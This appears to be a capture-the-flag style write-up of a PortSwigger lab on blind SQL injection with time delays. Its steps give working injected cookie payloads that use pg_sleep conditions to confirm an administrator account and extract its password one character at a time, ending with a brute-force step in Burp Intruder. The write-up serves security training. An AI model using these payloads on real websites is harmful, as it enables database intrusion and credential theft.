# SQL Injection - Blind SQLi with Time Delays and Information Retrieval

## 📌 Lab Details
- **Title**: Blind SQLi with Time Delays and Info Retrieval  
- **Difficulty**: Practitoner
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/90b742428496fd275bba4a89c5b13e2fa4dea4be3875ec8f6b09cdcd4cb63e7d?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-time-delays-info-retrieval

## 🔍 Summary
This lab demonstrated how SQL Injection can be used to produce time delays and retrieve information.

## 🛠 Steps to Solve
1. Modify the `TrackingId` cookie `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`. Verify that the application takes 10 seconds to respond.
2. `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`. Now the application responds with no time delay.
3. Now change the query to `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`. The time delays shows that there is a user named `administrator`.
4. To determine the number of characters in the password `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`.
5. Now determine the password using `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`.
6. Now brute force the password using `Intruder` to run multiple `Payloads`.
   
## 📖 Key Takeaways
- Understanding the concept of `Time Delay`.
- Understanding the retrieval of inforamtion using `Time Delay`.
  
## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/3fc47cc5-e6c7-4b29-88b2-899e0d677326)
![image](https://github.com/user-attachments/assets/2628feb8-895a-453f-9733-14b52d1b2921)
![image](https://github.com/user-attachments/assets/26624b6d-44b4-4918-b094-46125c1a3f6b)
![image](https://github.com/user-attachments/assets/a2a91cec-4b24-4019-bc45-5eb99d14b15b)
![image](https://github.com/user-attachments/assets/40551165-6fa3-4a30-8065-c237c39ffc22)
![image](https://github.com/user-attachments/assets/81dd6a10-5c81-4440-a297-16ef820a71cb)
![image](https://github.com/user-attachments/assets/bbdfd4c9-f4e2-4228-8ddf-45e4e8d1f7b5)

